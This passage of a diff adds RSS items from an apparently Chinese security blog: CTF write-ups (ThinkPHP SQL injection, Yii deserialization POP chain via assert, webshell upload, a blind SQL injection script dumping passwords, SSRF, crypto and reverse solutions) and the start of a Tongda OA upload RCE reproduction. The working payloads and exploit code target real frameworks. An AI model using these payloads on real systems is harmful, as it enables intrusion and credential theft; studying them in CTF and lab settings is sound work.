+	#print(url_get.cookies)
+	if url_get.status_code == 200:
+		print(url_get.text)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.题目:初心不改
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2370270929.png&#34; alt=&#34;1975DE5B-D07B-4569-B8D0-E7171F2A034C.png&#34;&gt;
+访问页面发现是一个thinkphp5.0 一猜就是sql注入
+一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码
+&lt;code&gt;/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2511860583.png&#34; alt=&#34;BA7D4195-9527-4B06-A1D8-28ABF453FE46.png&#34;&gt;
+主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3803853201.png&#34; alt=&#34;73F165EC-C956-40AD-9106-ADE323691340.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;crypto题&#34;&gt;web题我是全部AK掉了有些题目是通过exp直接拿到flag太简单了就不讲了。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3180203719.png&#34; alt=&#34;ADE2EF99-DEF7-46F4-AA7D-066EC4402E12.png&#34;&gt;
+Crypto题&lt;/h2&gt;
+&lt;p&gt;1.题目:震惊，凯撒竟被4人关在一密室&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;凯撒被4个人关在一个密室里！
+aCU3QjkxMjkxMTA3bjVnMTZoNjNjJTdEY2cwNDBoM2g4aTRlMDc3ZmYz
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先是base64
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/4195125983.png&#34; alt=&#34;9B275494-53D5-4527-8A72-F5844E6A5CD8.png&#34;&gt;
+然后url编码
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1834402293.png&#34; alt=&#34;647F179F-6624-426A-924B-3538D10E806A.png&#34;&gt;
+栅栏编码四组
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3756062370.png&#34; alt=&#34;9D959343-EA85-4A6D-85A4-7D017E27DDE7.png&#34;&gt;
+凯撒拿到flag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2613812638.png&#34; alt=&#34;9192AE6D-3539-4AC4-83FD-97E3D50A533A.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;2.题目:粗心大意的主管
+已知密文为:925♥♥♥A2D74♥♥DDE4♥EBC0♥♥♥1D0E♥♥7
+原文为:8E5♥♥C14DCD♥CDE8♥♥55F3738♥11DE7A。
+写个python就行了&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
+import string
+import hashlib
+payloads = &amp;#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;
+
+for a in payloads:
+    for b in payloads:
+        for c in payloads:
+        	for d in payloads:
+        		for e in payloads:
+        			for f in payloads:
+			            s = &amp;#34;8E5&amp;#34;+a+d+&amp;#34;C14DCD&amp;#34;+b+&amp;#34;CDE8&amp;#34;+e+c+&amp;#34;55F3738&amp;#34;+f+&amp;#34;11DE7A&amp;#34;
+			            tmp = hashlib.md5(s).hexdigest().upper()
+			            if &amp;#39;925&amp;#39; in tmp and &amp;#39;A2D74&amp;#39; in tmp and &amp;#39;DDE4&amp;#39; in tmp and &amp;#39;EBC0&amp;#39; in tmp:
+			                print(s)
+		               		print(tmp)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.题目:畸形的凯撒
+密文：afZ_rCI[kA55#;ASc9*%$c&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;char=&amp;#34;afZ_rCI[kA55#;ASc9*%$c&amp;#34;
+i = 0
+flag = &amp;#34;&amp;#34;
+while i &amp;lt; len(char):
+	num = ord(char[i])+(i+5)
+	flag+=chr(num)
+	i+=1
+print(flag)
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;reverse&#34;&gt;REVERSE&lt;/h2&gt;
+&lt;p&gt;1.题目:机密文件
+用NET.Reflector Pro工具打开文件
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2721756916.png&#34; alt=&#34;6B517F8B-57C6-43CC-AD32-AF739244D967.png&#34;&gt;
+看到源代码
+发现是aes加密使用openssl解密或者用c#再写一个解密的
+password也在里面
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3386985755.png&#34; alt=&#34;27E2F10D-6444-4F29-A275-9BBA743B8386.png&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/618023056.png&#34; alt=&#34;593D7C75-0E7F-4421-A4C7-A572F8ED6572.png&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;openssl aes-128-cbc -nosalt -d -in secret.636748579460890458.bin -iv 6b6a704853325367344c716637754e65 -K 6b6a704853325367344c716637754e65 -p
+&lt;/code&gt;&lt;/pre&gt;</content>
+    </item>
+    
+    <item>
+      <title>RedHat2021 CTF</title>
+      <link>https://vuln.top/posts/redhat2021/</link>
+      <pubDate>Tue, 15 Oct 2019 22:00:38 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/redhat2021/</guid>
+      <description>线上赛 find_it 打开题目第一步肯定访问robots.txt，可以看到1ndexx.php 访问后发现返回500，没有其他思路，猜测存在vim文件泄漏，查看.1ndexx.php.swp可以看到源码 查看代码可以看到是一个文件写入的程序，文件内容是可控的，文件后缀也是php，但是存在过滤，我们先写入一个phpinfo看一下 搜索下flag没想到直接拿到了.. framework 打开题目是一个yii的框架 直接下载备份文件www.zip,但是不知道为什么我一直下不下来。修改头部Range才成功下载。 直接查看控制器，发现actionAbout存在反序列化漏洞，那直接用公开的yii pop链打就行了 找到一个公开的链可以直接用，可能system被过滤了无法直接使用，通过assert绕过
+&amp;lt;?php namespace yii\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&amp;gt;checkAccess = &amp;#39;assert&amp;#39;; $this-&amp;gt;id = &amp;#39;phpinfo();&amp;#39;; } } } namespace Faker{ use yii\rest\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&amp;gt;formatters[&amp;#39;close&amp;#39;] = [new CreateAction(), &amp;#39;run&amp;#39;]; } } } namespace yii\db{ use Faker\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&amp;gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\db\BatchQueryResult)); } ?</description>
+      <content>&lt;h1 id=&#34;线上赛&#34;&gt;线上赛&lt;/h1&gt;
+&lt;h2 id=&#34;find_it&#34;&gt;find_it&lt;/h2&gt;
+&lt;p&gt;打开题目第一步肯定访问robots.txt，可以看到&lt;code&gt;1ndexx.php&lt;/code&gt;
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205712694789.jpg&#34; alt=&#34;-w1058&#34;&gt;
+访问后发现返回&lt;code&gt;500&lt;/code&gt;，没有其他思路，猜测存在vim文件泄漏，查看&lt;code&gt;.1ndexx.php.swp&lt;/code&gt;可以看到源码
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205733649105.jpg&#34; alt=&#34;-w1794&#34;&gt;
+查看代码可以看到是一个文件写入的程序，文件内容是可控的，文件后缀也是php，但是存在过滤，我们先写入一个phpinfo看一下
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205735768896.jpg&#34; alt=&#34;-w1396&#34;&gt;
+搜索下flag没想到直接拿到了..
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205735977221.jpg&#34; alt=&#34;-w1688&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;framework&#34;&gt;framework&lt;/h2&gt;
+&lt;p&gt;打开题目是一个yii的框架
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205736979172.jpg&#34; alt=&#34;-w1746&#34;&gt;
+直接下载备份文件www.zip,但是不知道为什么我一直下不下来。修改头部Range才成功下载。
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205738069301.jpg&#34; alt=&#34;-w1827&#34;&gt;
+直接查看控制器，发现actionAbout存在反序列化漏洞，那直接用公开的yii pop链打就行了
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205739861881.jpg&#34; alt=&#34;-w1476&#34;&gt;
+找到一个公开的链可以直接用，可能system被过滤了无法直接使用，通过assert绕过&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;yii\rest&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CreateAction&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $checkAccess;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $id;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;checkAccess&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;assert&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phpinfo();&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Faker&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;yii\rest\CreateAction&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Generator&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $formatters;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;formatters&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;close&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CreateAction&lt;/span&gt;(), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;run&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;yii\db&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Faker\Generator&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BatchQueryResult&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; $_dataReader;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_dataReader&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Generator&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;yii\db\BatchQueryResult&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功执行phpinfo但是查看了disable_functions存在过滤
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205744634390.jpg&#34; alt=&#34;-w1800&#34;&gt;&lt;/p&gt;
+&lt;p&gt;既然存在过滤，先传一个一句话吧，代码执行通过file_put_contents直接写入shell
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205748137803.jpg&#34; alt=&#34;-w1165&#34;&gt;
+通过蚁剑插件直接绕过&lt;code&gt;disable_functions&lt;/code&gt;,拿到flag
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205749591232.jpg&#34; alt=&#34;-w1076&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;websitemanger&#34;&gt;WebsiteManger&lt;/h2&gt;
+&lt;p&gt;拿到题目查看源代码，可以看见&lt;code&gt;image.php?id=2&lt;/code&gt;很可疑
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205751063801.jpg&#34; alt=&#34;-w1386&#34;&gt;
+尝试异或注入，发现^1和^0的结果不一样说明存在注入
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205751900359.jpg&#34; alt=&#34;-w1268&#34;&gt;
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205752113058.jpg&#34; alt=&#34;-w1466&#34;&gt;
+过滤了空格但是ascii、mid、select都没过滤，直接构造payload
+&lt;code&gt;/image.php?id=2^(ascii(mid((select/**/database())from(1)))&amp;gt;1)&lt;/code&gt;
+database()的第一位 ascii码大于1，语句肯定是成立的所以返回如下图片
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205754545410.jpg&#34; alt=&#34;-w1521&#34;&gt;
+database()的第一位 ascii码大于1000，语句肯定是不成立的所以返回如下图片
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205755572185.jpg&#34; alt=&#34;-w1299&#34;&gt;
+根据如上判断直接编写脚本，&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;为等于符号，判断只要返回长度大于190467即为正确
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205756938718.jpg&#34; alt=&#34;-w1511&#34;&gt;
+之后依次构造查表，查字段即可，如下给出exp&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;hashlib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sss &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,1234567890._&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#sss = string.digits + string.lowercase&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; sss:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#75715e&#34;&gt;#print(j)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#75715e&#34;&gt;#payload = &amp;#39;/image.php?id=3^(ascii(mid((select/**/database())from(%s)))&amp;lt;&amp;gt;%s)&amp;#39; % (i, ord(j))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#75715e&#34;&gt;#payload = &amp;#39;/image.php?id=3^(ascii(mid((select/**/group_concat(SCHEMA_NAME)/**/from/**/information_schema.schemata)from(%s)))&amp;lt;&amp;gt;%s)&amp;#39; % (i, ord(j))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       	&lt;span style=&#34;color:#75715e&#34;&gt;#payload = &amp;#39;/image.php?id=3^(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from(%s)))&amp;lt;&amp;gt;%s)&amp;#39; % (i, ord(j))#images,users&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#payload = &amp;#39;/image.php?id=3^(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273)from(%s)))&amp;lt;&amp;gt;%s)&amp;#39;%(i, ord(j))#username,password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/image.php?id=3^(ascii(mid((select/**/group_concat(password)/**/from/**/users)from(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)))&amp;lt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)#&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;(i, ord(j))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#    print(url+payload)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;#     print(len(res))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(res) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;190467&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            a &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; j
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print a
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; flag &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(a)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;登陆成功后是一个curl页面存在ssrf，直接通过file:///flag即可
+&lt;img src=&#34;https://vuln.top/img/16205711767451/16205758977490.jpg&#34; alt=&#34;-w1667&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>通达OA文件上传&amp;文件包含导致RCE复现</title>
+      <link>https://vuln.top/posts/tongdaoarce/</link>
+      <pubDate>Tue, 15 Oct 2019 22:00:38 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/tongdaoarce/</guid>
+      <description>漏洞复现 影响版本： V11版 2017版 2016版 2015版 2013版 2013增强版 测试环境： 11.2.191129 漏洞复现： 通过 /ispirit/im/upload.php 页面，未授权文件上传一个一句话文件，可获得路径和文件名。
